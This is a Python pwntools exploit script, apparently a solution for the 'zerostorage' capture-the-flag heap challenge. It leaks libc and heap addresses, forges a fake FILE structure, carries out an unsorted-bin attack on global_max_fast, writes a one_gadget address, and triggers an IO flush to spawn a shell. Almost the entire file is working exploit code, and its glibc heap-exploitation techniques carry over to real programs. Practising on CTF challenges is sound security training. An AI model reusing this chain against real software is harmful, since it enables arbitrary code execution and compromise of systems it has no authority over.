#!/usr/bin/env python
from pwn import *
from FILE import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./zerostorage')
    elf = ELF('./zerostorage')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('127.0.0.1', 8888)
    elf = ELF('./zerostorage')
    libc = ELF('./libc.so.6')

def choice(c):
    p.sendlineafter('Your choice: ', str(c))

def insert(sz, data):
    choice(1)
    p.sendlineafter('Length of new entry: ', str(sz))
    p.sendafter('Enter your data: ', data)

def update(idx, sz, data):
    choice(2)
    p.sendlineafter('Entry ID: ', str(idx))
    p.sendlineafter('Length of entry: ', str(sz))
    p.sendafter('Enter your data: ', data)

def merge(idx1, idx2):
    choice(3)
    p.sendlineafter('Merge from Entry ID: ', str(idx1))
    p.sendlineafter('Merge to Entry ID: ', str(idx2))

def delete(idx):
    choice(4)
    p.sendlineafter('Entry ID: ', str(idx))

def view(idx):
    choice(5)
    p.sendlineafter('Entry ID: ', str(idx))

# # References
# - https://www.anquanke.com/post/id/178418

# leak libc & heap
insert(0x40, 0x40 * '0') # 0
insert(0x40, 0x40 * '1') # 1
insert(0x40, 0x40 * '2') # 2
insert(0x40, 0x40 * '3') # 3
insert(0x40, 0x40 * '4') # 4
insert(0x1000-0x10, (0x1000-0x10) * '5') # 5
insert(0x400, 0x400 * '6') # 6
insert(0x400, 0x400 * '7') # 7
insert(0x40, 0x40 * '8') # 8
insert(0x60, 0x60 * '9') # 9
delete(6)
merge(7, 5) # 6
insert(0x400, 0x400 * '5') # 5
merge(0, 0) # 7
merge(2, 2) # 0
view(7)
p.recvuntil(':\n')
unsorted_bin = u64(p.recv(8))
libc_base = unsorted_bin - 0x3c4b78
heap_base = u64(p.recv(8)) - 0x120
info('libc_base = ' + hex(libc_base))
info('heap_base = ' + hex(heap_base))

# create a fake file structure
fake_file = IO_FILE_plus_struct()
fake_file._IO_write_base = 0
fake_file._IO_write_ptr = 1
fake_file.vtable = heap_base + 0x1b90
update(6, 0x1000-0x10, str(fake_file)[0x10:].ljust(0x1000-0x10, '6'))

# merge a big chunk (0x1410)
merge(5, 6) # 2

# unsorted bin attack
global_max_fast = libc_base + 0x3c67f8
one_gadgets = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
one_gadget = libc_base + one_gadgets[3]
info('one_gadget = ' + hex(one_gadget))
update(7, 0x10, p64(unsorted_bin) + p64(global_max_fast - 0x10))
insert(0x40, 0x40 * '5') # 5
update(9, 0x20, 0x18 * '\x00' + p64(one_gadget))

# overwrite _IO_list_all
delete(2)

# trigger io flush to get shell
p.recvuntil(':')
p.sendline('1')
p.recvuntil(':')
p.sendline('100')

#gdb.attach(p)

p.interactive()

